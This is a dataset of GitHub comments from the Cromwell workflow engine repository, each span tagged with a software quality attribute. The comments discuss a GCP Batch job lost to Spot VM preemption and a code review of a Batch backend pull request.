https://github.com/broadinstitute/cromwell/issues/7407#issuecomment-2061445630:729,Deployability,update,updated,729,"Hi @dspeck1 ,. Thanks for your reply. The is the cromwell outputs when things happened:. ```; =======================log start============. status_events {; description: ""Job state is set from QUEUED to SCHEDULED for job projects/A_JOB_ID.""; event_time {; seconds: 1713287682; nanos: 566509009; }; type: ""STATUS_CHANGED""; }; status_events {; description: ""Job state is set from SCHEDULED to RUNNING for job projects/A_JOB_ID.""; event_time {; seconds: 1713287919; nanos: 96623968; }; type: ""STATUS_CHANGED""; }; status_events {; description: ""Job state is set from RUNNING to FAILED for job projects/A_JOB_ID. Job failed due to task failures; . For example, task with index 0 failed, failed task event description is Task state is updated from RUNNING to FAILED on zones/A_INSTANCE_ID due to Spot VM; preemption with exit code 50001.""; event_time {; seconds: 1713288624; nanos: 767597866; }; type: ""STATUS_CHANGED""; }. task_groups {; key: ""group0""; value {; counts {; key: ""FAILED""; value: 1; }; instances {; machine_type: ""e2-standard-2""; provisioning_model: SPOT; task_pack: 1; boot_disk {; type: ""pd-balanced""; size_gb: 30; image: ""projects/batch-custom-image/global/images/batch-cos-stable-official-20240320-01-p00""; }; }; }; }; run_duration {; seconds: 705; nanos: 670973898; }. 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.backend-dispatcher-2485 INFO - GcpBatchAsyncBackendJobExecutionActor [UUID(0c7363b7)Test.mergeTest:NA:1]: Status change fr; om Running to Failed; 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.backend-dispatcher-2485 INFO - isTerminal match terminal run status with Failed; 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.backend-dispatcher-2485 INFO - GCP batch job unsuccessful matched isDone; 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.engine-dispatcher-2358 INFO - WorkflowManagerActor: Workflow 0c7363b7-6b8f-48cf-8f38-f66d127b305f failed (during ExecutingWorkflowSta; te): java.lang.RuntimeException: Task Test.mergeTest:NA:1 failed for un",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7407#issuecomment-2061445630
https://github.com/broadinstitute/cromwell/issues/7407#issuecomment-2061445630:203,Energy Efficiency,SCHEDUL,SCHEDULED,203,"Hi @dspeck1 ,. Thanks for your reply. The is the cromwell outputs when things happened:. ```; =======================log start============. status_events {; description: ""Job state is set from QUEUED to SCHEDULED for job projects/A_JOB_ID.""; event_time {; seconds: 1713287682; nanos: 566509009; }; type: ""STATUS_CHANGED""; }; status_events {; description: ""Job state is set from SCHEDULED to RUNNING for job projects/A_JOB_ID.""; event_time {; seconds: 1713287919; nanos: 96623968; }; type: ""STATUS_CHANGED""; }; status_events {; description: ""Job state is set from RUNNING to FAILED for job projects/A_JOB_ID. Job failed due to task failures; . For example, task with index 0 failed, failed task event description is Task state is updated from RUNNING to FAILED on zones/A_INSTANCE_ID due to Spot VM; preemption with exit code 50001.""; event_time {; seconds: 1713288624; nanos: 767597866; }; type: ""STATUS_CHANGED""; }. task_groups {; key: ""group0""; value {; counts {; key: ""FAILED""; value: 1; }; instances {; machine_type: ""e2-standard-2""; provisioning_model: SPOT; task_pack: 1; boot_disk {; type: ""pd-balanced""; size_gb: 30; image: ""projects/batch-custom-image/global/images/batch-cos-stable-official-20240320-01-p00""; }; }; }; }; run_duration {; seconds: 705; nanos: 670973898; }. 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.backend-dispatcher-2485 INFO - GcpBatchAsyncBackendJobExecutionActor [UUID(0c7363b7)Test.mergeTest:NA:1]: Status change fr; om Running to Failed; 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.backend-dispatcher-2485 INFO - isTerminal match terminal run status with Failed; 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.backend-dispatcher-2485 INFO - GCP batch job unsuccessful matched isDone; 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.engine-dispatcher-2358 INFO - WorkflowManagerActor: Workflow 0c7363b7-6b8f-48cf-8f38-f66d127b305f failed (during ExecutingWorkflowSta; te): java.lang.RuntimeException: Task Test.mergeTest:NA:1 failed for un",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7407#issuecomment-2061445630
https://github.com/broadinstitute/cromwell/issues/7407#issuecomment-2061445630:378,Energy Efficiency,SCHEDUL,SCHEDULED,378,"Hi @dspeck1 ,. Thanks for your reply. The is the cromwell outputs when things happened:. ```; =======================log start============. status_events {; description: ""Job state is set from QUEUED to SCHEDULED for job projects/A_JOB_ID.""; event_time {; seconds: 1713287682; nanos: 566509009; }; type: ""STATUS_CHANGED""; }; status_events {; description: ""Job state is set from SCHEDULED to RUNNING for job projects/A_JOB_ID.""; event_time {; seconds: 1713287919; nanos: 96623968; }; type: ""STATUS_CHANGED""; }; status_events {; description: ""Job state is set from RUNNING to FAILED for job projects/A_JOB_ID. Job failed due to task failures; . For example, task with index 0 failed, failed task event description is Task state is updated from RUNNING to FAILED on zones/A_INSTANCE_ID due to Spot VM; preemption with exit code 50001.""; event_time {; seconds: 1713288624; nanos: 767597866; }; type: ""STATUS_CHANGED""; }. task_groups {; key: ""group0""; value {; counts {; key: ""FAILED""; value: 1; }; instances {; machine_type: ""e2-standard-2""; provisioning_model: SPOT; task_pack: 1; boot_disk {; type: ""pd-balanced""; size_gb: 30; image: ""projects/batch-custom-image/global/images/batch-cos-stable-official-20240320-01-p00""; }; }; }; }; run_duration {; seconds: 705; nanos: 670973898; }. 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.backend-dispatcher-2485 INFO - GcpBatchAsyncBackendJobExecutionActor [UUID(0c7363b7)Test.mergeTest:NA:1]: Status change fr; om Running to Failed; 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.backend-dispatcher-2485 INFO - isTerminal match terminal run status with Failed; 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.backend-dispatcher-2485 INFO - GCP batch job unsuccessful matched isDone; 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.engine-dispatcher-2358 INFO - WorkflowManagerActor: Workflow 0c7363b7-6b8f-48cf-8f38-f66d127b305f failed (during ExecutingWorkflowSta; te): java.lang.RuntimeException: Task Test.mergeTest:NA:1 failed for un",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7407#issuecomment-2061445630
https://github.com/broadinstitute/cromwell/issues/7407#issuecomment-2061445630:193,Performance,QUEUE,QUEUED,193,"Hi @dspeck1 ,. Thanks for your reply. The is the cromwell outputs when things happened:. ```; =======================log start============. status_events {; description: ""Job state is set from QUEUED to SCHEDULED for job projects/A_JOB_ID.""; event_time {; seconds: 1713287682; nanos: 566509009; }; type: ""STATUS_CHANGED""; }; status_events {; description: ""Job state is set from SCHEDULED to RUNNING for job projects/A_JOB_ID.""; event_time {; seconds: 1713287919; nanos: 96623968; }; type: ""STATUS_CHANGED""; }; status_events {; description: ""Job state is set from RUNNING to FAILED for job projects/A_JOB_ID. Job failed due to task failures; . For example, task with index 0 failed, failed task event description is Task state is updated from RUNNING to FAILED on zones/A_INSTANCE_ID due to Spot VM; preemption with exit code 50001.""; event_time {; seconds: 1713288624; nanos: 767597866; }; type: ""STATUS_CHANGED""; }. task_groups {; key: ""group0""; value {; counts {; key: ""FAILED""; value: 1; }; instances {; machine_type: ""e2-standard-2""; provisioning_model: SPOT; task_pack: 1; boot_disk {; type: ""pd-balanced""; size_gb: 30; image: ""projects/batch-custom-image/global/images/batch-cos-stable-official-20240320-01-p00""; }; }; }; }; run_duration {; seconds: 705; nanos: 670973898; }. 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.backend-dispatcher-2485 INFO - GcpBatchAsyncBackendJobExecutionActor [UUID(0c7363b7)Test.mergeTest:NA:1]: Status change fr; om Running to Failed; 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.backend-dispatcher-2485 INFO - isTerminal match terminal run status with Failed; 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.backend-dispatcher-2485 INFO - GCP batch job unsuccessful matched isDone; 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.engine-dispatcher-2358 INFO - WorkflowManagerActor: Workflow 0c7363b7-6b8f-48cf-8f38-f66d127b305f failed (during ExecutingWorkflowSta; te): java.lang.RuntimeException: Task Test.mergeTest:NA:1 failed for un",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7407#issuecomment-2061445630
https://github.com/broadinstitute/cromwell/issues/7407#issuecomment-2061445630:2714,Performance,concurren,concurrent,2714,"dispatcher-2485 INFO - GCP batch job unsuccessful matched isDone; 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.engine-dispatcher-2358 INFO - WorkflowManagerActor: Workflow 0c7363b7-6b8f-48cf-8f38-f66d127b305f failed (during ExecutingWorkflowSta; te): java.lang.RuntimeException: Task Test.mergeTest:NA:1 failed for unknown reason: Failed. at cromwell.backend.standard.StandardAsyncExecutionActor.handleExecutionFailure(StandardAsyncExecutionActor.scala:1170); at cromwell.backend.standard.StandardAsyncExecutionActor.handleExecutionFailure$(StandardAsyncExecutionActor.scala:1169); at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.handleExecutionFailure(GcpBatchAsyncBackendJobExecutionActor.scala:123); at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$11.applyOrElse(StandardAsyncExecutionActor.scala:1442); at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$11.applyOrElse(StandardAsyncExecutionActor.scala:1439); at scala.concurrent.impl.Promise$Transformation.run(Promise.scala:490); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:41); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:49); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). 2024-04-16 17:30:28 cromwell-system-akka.dispatchers.engine-dispatcher-2309 INFO - WorkflowManagerActor: Workflow actor for 0c7363b7-6b8f-48cf-8f38-f66d127b305f completed with status 'Fa; iled'. The workflow will be removed from the workflow store. =======================log end============; ```. Thanks. If I run the WDL again, it works without any problem. The jobs fails will always be preempted. Regards,; Zhili",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7407#issuecomment-2061445630
https://github.com/broadinstitute/cromwell/issues/7407#issuecomment-2061445630:117,Testability,log,log,117,"Hi @dspeck1 ,. Thanks for your reply. The is the cromwell outputs when things happened:. ```; =======================log start============. status_events {; description: ""Job state is set from QUEUED to SCHEDULED for job projects/A_JOB_ID.""; event_time {; seconds: 1713287682; nanos: 566509009; }; type: ""STATUS_CHANGED""; }; status_events {; description: ""Job state is set from SCHEDULED to RUNNING for job projects/A_JOB_ID.""; event_time {; seconds: 1713287919; nanos: 96623968; }; type: ""STATUS_CHANGED""; }; status_events {; description: ""Job state is set from RUNNING to FAILED for job projects/A_JOB_ID. Job failed due to task failures; . For example, task with index 0 failed, failed task event description is Task state is updated from RUNNING to FAILED on zones/A_INSTANCE_ID due to Spot VM; preemption with exit code 50001.""; event_time {; seconds: 1713288624; nanos: 767597866; }; type: ""STATUS_CHANGED""; }. task_groups {; key: ""group0""; value {; counts {; key: ""FAILED""; value: 1; }; instances {; machine_type: ""e2-standard-2""; provisioning_model: SPOT; task_pack: 1; boot_disk {; type: ""pd-balanced""; size_gb: 30; image: ""projects/batch-custom-image/global/images/batch-cos-stable-official-20240320-01-p00""; }; }; }; }; run_duration {; seconds: 705; nanos: 670973898; }. 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.backend-dispatcher-2485 INFO - GcpBatchAsyncBackendJobExecutionActor [UUID(0c7363b7)Test.mergeTest:NA:1]: Status change fr; om Running to Failed; 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.backend-dispatcher-2485 INFO - isTerminal match terminal run status with Failed; 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.backend-dispatcher-2485 INFO - GCP batch job unsuccessful matched isDone; 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.engine-dispatcher-2358 INFO - WorkflowManagerActor: Workflow 0c7363b7-6b8f-48cf-8f38-f66d127b305f failed (during ExecutingWorkflowSta; te): java.lang.RuntimeException: Task Test.mergeTest:NA:1 failed for un",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7407#issuecomment-2061445630
https://github.com/broadinstitute/cromwell/issues/7407#issuecomment-2061445630:1419,Testability,Test,Test,1419,"CHEDULED to RUNNING for job projects/A_JOB_ID.""; event_time {; seconds: 1713287919; nanos: 96623968; }; type: ""STATUS_CHANGED""; }; status_events {; description: ""Job state is set from RUNNING to FAILED for job projects/A_JOB_ID. Job failed due to task failures; . For example, task with index 0 failed, failed task event description is Task state is updated from RUNNING to FAILED on zones/A_INSTANCE_ID due to Spot VM; preemption with exit code 50001.""; event_time {; seconds: 1713288624; nanos: 767597866; }; type: ""STATUS_CHANGED""; }. task_groups {; key: ""group0""; value {; counts {; key: ""FAILED""; value: 1; }; instances {; machine_type: ""e2-standard-2""; provisioning_model: SPOT; task_pack: 1; boot_disk {; type: ""pd-balanced""; size_gb: 30; image: ""projects/batch-custom-image/global/images/batch-cos-stable-official-20240320-01-p00""; }; }; }; }; run_duration {; seconds: 705; nanos: 670973898; }. 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.backend-dispatcher-2485 INFO - GcpBatchAsyncBackendJobExecutionActor [UUID(0c7363b7)Test.mergeTest:NA:1]: Status change fr; om Running to Failed; 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.backend-dispatcher-2485 INFO - isTerminal match terminal run status with Failed; 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.backend-dispatcher-2485 INFO - GCP batch job unsuccessful matched isDone; 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.engine-dispatcher-2358 INFO - WorkflowManagerActor: Workflow 0c7363b7-6b8f-48cf-8f38-f66d127b305f failed (during ExecutingWorkflowSta; te): java.lang.RuntimeException: Task Test.mergeTest:NA:1 failed for unknown reason: Failed. at cromwell.backend.standard.StandardAsyncExecutionActor.handleExecutionFailure(StandardAsyncExecutionActor.scala:1170); at cromwell.backend.standard.StandardAsyncExecutionActor.handleExecutionFailure$(StandardAsyncExecutionActor.scala:1169); at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.handleExecutionFailure(GcpBatchAsync",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7407#issuecomment-2061445630
https://github.com/broadinstitute/cromwell/issues/7407#issuecomment-2061445630:1968,Testability,Test,Test,1968,"nts {; key: ""FAILED""; value: 1; }; instances {; machine_type: ""e2-standard-2""; provisioning_model: SPOT; task_pack: 1; boot_disk {; type: ""pd-balanced""; size_gb: 30; image: ""projects/batch-custom-image/global/images/batch-cos-stable-official-20240320-01-p00""; }; }; }; }; run_duration {; seconds: 705; nanos: 670973898; }. 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.backend-dispatcher-2485 INFO - GcpBatchAsyncBackendJobExecutionActor [UUID(0c7363b7)Test.mergeTest:NA:1]: Status change fr; om Running to Failed; 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.backend-dispatcher-2485 INFO - isTerminal match terminal run status with Failed; 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.backend-dispatcher-2485 INFO - GCP batch job unsuccessful matched isDone; 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.engine-dispatcher-2358 INFO - WorkflowManagerActor: Workflow 0c7363b7-6b8f-48cf-8f38-f66d127b305f failed (during ExecutingWorkflowSta; te): java.lang.RuntimeException: Task Test.mergeTest:NA:1 failed for unknown reason: Failed. at cromwell.backend.standard.StandardAsyncExecutionActor.handleExecutionFailure(StandardAsyncExecutionActor.scala:1170); at cromwell.backend.standard.StandardAsyncExecutionActor.handleExecutionFailure$(StandardAsyncExecutionActor.scala:1169); at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.handleExecutionFailure(GcpBatchAsyncBackendJobExecutionActor.scala:123); at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$11.applyOrElse(StandardAsyncExecutionActor.scala:1442); at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$11.applyOrElse(StandardAsyncExecutionActor.scala:1439); at scala.concurrent.impl.Promise$Transformation.run(Promise.scala:490); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:41); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:49); at akka.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7407#issuecomment-2061445630
https://github.com/broadinstitute/cromwell/issues/7407#issuecomment-2061445630:3532,Testability,log,log,3532,"dispatcher-2485 INFO - GCP batch job unsuccessful matched isDone; 2024-04-16 17:30:25 cromwell-system-akka.dispatchers.engine-dispatcher-2358 INFO - WorkflowManagerActor: Workflow 0c7363b7-6b8f-48cf-8f38-f66d127b305f failed (during ExecutingWorkflowSta; te): java.lang.RuntimeException: Task Test.mergeTest:NA:1 failed for unknown reason: Failed. at cromwell.backend.standard.StandardAsyncExecutionActor.handleExecutionFailure(StandardAsyncExecutionActor.scala:1170); at cromwell.backend.standard.StandardAsyncExecutionActor.handleExecutionFailure$(StandardAsyncExecutionActor.scala:1169); at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.handleExecutionFailure(GcpBatchAsyncBackendJobExecutionActor.scala:123); at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$11.applyOrElse(StandardAsyncExecutionActor.scala:1442); at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$11.applyOrElse(StandardAsyncExecutionActor.scala:1439); at scala.concurrent.impl.Promise$Transformation.run(Promise.scala:490); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:41); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:49); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). 2024-04-16 17:30:28 cromwell-system-akka.dispatchers.engine-dispatcher-2309 INFO - WorkflowManagerActor: Workflow actor for 0c7363b7-6b8f-48cf-8f38-f66d127b305f completed with status 'Fa; iled'. The workflow will be removed from the workflow store. =======================log end============; ```. Thanks. If I run the WDL again, it works without any problem. The jobs fails will always be preempted. Regards,; Zhili",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7407#issuecomment-2061445630
https://github.com/broadinstitute/cromwell/issues/7408#issuecomment-2110532858:45,Deployability,release,release,45,@osha52101 - please run this with the latest release (87). I believe this issue was resolved.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7408#issuecomment-2110532858
https://github.com/broadinstitute/cromwell/pull/7411#issuecomment-2110744992:42,Testability,test,tests,42,"@aednichols the comments are resolved and tests are passing, thanks.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7411#issuecomment-2110744992
https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2104444317:77,Usability,feedback,feedback,77,"@aednichols I have addressed all my TODO items, it would be nice to get some feedback. Thanks.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2104444317
https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2110608130:269,Deployability,configurat,configuration,269,"Nice work! I'll answer questions before reviewing line-by-line in case it leads to changes. 1. `-e` is for exclude. There is a `papi_v2beta_gcsa.test` that should be running under Batch still. I believe the Beta version is a fairly essential test because it checks the configuration Terra uses for auth (though I'm not 100% sure on this one).; 2. We use Codecov as an advisory thing, if the human developers think the tests are solid, they're solid.; 3. I think I'd need to know more detail about what the test checks for and how it fails. Looking at the comment in `StandardAsyncExecutionActor#requestsAbortAndDiesImmediately`, it does seem like we may want the `false` behavior because it's responsible for some finalization activities around the job.; 4. 100 workers seems like a lot? I think our default for PAPI is 3, and we stick to that default in Terra. Is the Batch behavior radically different, motivating 100? I totally agree that the formula could use re-evaluation (or maybe even elimination).; 5. That seems fine. So long as we have some kind of handling for every case in com.google.cloud.batch.v1.JobStatus.State` we should be good. The execution events are designed to be tied closely to the implementation of the backend with minimal translation or invention of new states.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2110608130
https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2110608130:269,Modifiability,config,configuration,269,"Nice work! I'll answer questions before reviewing line-by-line in case it leads to changes. 1. `-e` is for exclude. There is a `papi_v2beta_gcsa.test` that should be running under Batch still. I believe the Beta version is a fairly essential test because it checks the configuration Terra uses for auth (though I'm not 100% sure on this one).; 2. We use Codecov as an advisory thing, if the human developers think the tests are solid, they're solid.; 3. I think I'd need to know more detail about what the test checks for and how it fails. Looking at the comment in `StandardAsyncExecutionActor#requestsAbortAndDiesImmediately`, it does seem like we may want the `false` behavior because it's responsible for some finalization activities around the job.; 4. 100 workers seems like a lot? I think our default for PAPI is 3, and we stick to that default in Terra. Is the Batch behavior radically different, motivating 100? I totally agree that the formula could use re-evaluation (or maybe even elimination).; 5. That seems fine. So long as we have some kind of handling for every case in com.google.cloud.batch.v1.JobStatus.State` we should be good. The execution events are designed to be tied closely to the implementation of the backend with minimal translation or invention of new states.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2110608130
https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2110608130:145,Testability,test,test,145,"Nice work! I'll answer questions before reviewing line-by-line in case it leads to changes. 1. `-e` is for exclude. There is a `papi_v2beta_gcsa.test` that should be running under Batch still. I believe the Beta version is a fairly essential test because it checks the configuration Terra uses for auth (though I'm not 100% sure on this one).; 2. We use Codecov as an advisory thing, if the human developers think the tests are solid, they're solid.; 3. I think I'd need to know more detail about what the test checks for and how it fails. Looking at the comment in `StandardAsyncExecutionActor#requestsAbortAndDiesImmediately`, it does seem like we may want the `false` behavior because it's responsible for some finalization activities around the job.; 4. 100 workers seems like a lot? I think our default for PAPI is 3, and we stick to that default in Terra. Is the Batch behavior radically different, motivating 100? I totally agree that the formula could use re-evaluation (or maybe even elimination).; 5. That seems fine. So long as we have some kind of handling for every case in com.google.cloud.batch.v1.JobStatus.State` we should be good. The execution events are designed to be tied closely to the implementation of the backend with minimal translation or invention of new states.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2110608130
https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2110608130:242,Testability,test,test,242,"Nice work! I'll answer questions before reviewing line-by-line in case it leads to changes. 1. `-e` is for exclude. There is a `papi_v2beta_gcsa.test` that should be running under Batch still. I believe the Beta version is a fairly essential test because it checks the configuration Terra uses for auth (though I'm not 100% sure on this one).; 2. We use Codecov as an advisory thing, if the human developers think the tests are solid, they're solid.; 3. I think I'd need to know more detail about what the test checks for and how it fails. Looking at the comment in `StandardAsyncExecutionActor#requestsAbortAndDiesImmediately`, it does seem like we may want the `false` behavior because it's responsible for some finalization activities around the job.; 4. 100 workers seems like a lot? I think our default for PAPI is 3, and we stick to that default in Terra. Is the Batch behavior radically different, motivating 100? I totally agree that the formula could use re-evaluation (or maybe even elimination).; 5. That seems fine. So long as we have some kind of handling for every case in com.google.cloud.batch.v1.JobStatus.State` we should be good. The execution events are designed to be tied closely to the implementation of the backend with minimal translation or invention of new states.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2110608130
https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2110608130:418,Testability,test,tests,418,"Nice work! I'll answer questions before reviewing line-by-line in case it leads to changes. 1. `-e` is for exclude. There is a `papi_v2beta_gcsa.test` that should be running under Batch still. I believe the Beta version is a fairly essential test because it checks the configuration Terra uses for auth (though I'm not 100% sure on this one).; 2. We use Codecov as an advisory thing, if the human developers think the tests are solid, they're solid.; 3. I think I'd need to know more detail about what the test checks for and how it fails. Looking at the comment in `StandardAsyncExecutionActor#requestsAbortAndDiesImmediately`, it does seem like we may want the `false` behavior because it's responsible for some finalization activities around the job.; 4. 100 workers seems like a lot? I think our default for PAPI is 3, and we stick to that default in Terra. Is the Batch behavior radically different, motivating 100? I totally agree that the formula could use re-evaluation (or maybe even elimination).; 5. That seems fine. So long as we have some kind of handling for every case in com.google.cloud.batch.v1.JobStatus.State` we should be good. The execution events are designed to be tied closely to the implementation of the backend with minimal translation or invention of new states.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2110608130
https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2110608130:506,Testability,test,test,506,"Nice work! I'll answer questions before reviewing line-by-line in case it leads to changes. 1. `-e` is for exclude. There is a `papi_v2beta_gcsa.test` that should be running under Batch still. I believe the Beta version is a fairly essential test because it checks the configuration Terra uses for auth (though I'm not 100% sure on this one).; 2. We use Codecov as an advisory thing, if the human developers think the tests are solid, they're solid.; 3. I think I'd need to know more detail about what the test checks for and how it fails. Looking at the comment in `StandardAsyncExecutionActor#requestsAbortAndDiesImmediately`, it does seem like we may want the `false` behavior because it's responsible for some finalization activities around the job.; 4. 100 workers seems like a lot? I think our default for PAPI is 3, and we stick to that default in Terra. Is the Batch behavior radically different, motivating 100? I totally agree that the formula could use re-evaluation (or maybe even elimination).; 5. That seems fine. So long as we have some kind of handling for every case in com.google.cloud.batch.v1.JobStatus.State` we should be good. The execution events are designed to be tied closely to the implementation of the backend with minimal translation or invention of new states.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2110608130
https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2110742874:409,Deployability,configurat,configuration,409,"Thanks for reviewing this, so far I don't expect considerable code changes to be made. I have saw that you approved a few other PRs, it could be a good idea to wait for them to get merged before reviewing this one to reduce the diff. > 1. -e is for exclude. There is a papi_v2beta_gcsa.test that should be running under Batch still. I believe the Beta version is a fairly essential test because it checks the configuration Terra uses for auth (though I'm not 100% sure on this one). I have not familiarized myself yet with Centaur which is why I preferred asking. > 2. We use Codecov as an advisory thing, if the human developers think the tests are solid, they're solid. I was thinking that there could be a wrong setup, perhaps running the wrong tests which would explain why code with tests was marked with no coverage, still, I have the impression that the behavior improved since #7418 was merged. > 3. I think I'd need to know more detail about what the test checks for and how it fails. Looking at the comment in StandardAsyncExecutionActor#requestsAbortAndDiesImmediately, it does seem like we may want the false behavior because it's responsible for some finalization activities around the job. Agree, do you have any insights on how can I possibly test this to save some research time?. > 4.. 100 workers seems like a lot? I think our default for PAPI is 3, and we stick to that default in Terra. Is the Batch behavior radically different, motivating 100? I totally agree that the formula could use re-evaluation (or maybe even elimination). Yes, they are quite a lot but we were testing different parameters and found this behavior, still, it seems worth to leave this for another PR. > 5. That seems fine. So long as we have some kind of handling for every case in com.google.cloud.batch.v1.JobStatus.State` we should be good. The execution events are designed to be tied closely to the implementation of the backend with minimal translation or invention of new states. Great.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2110742874
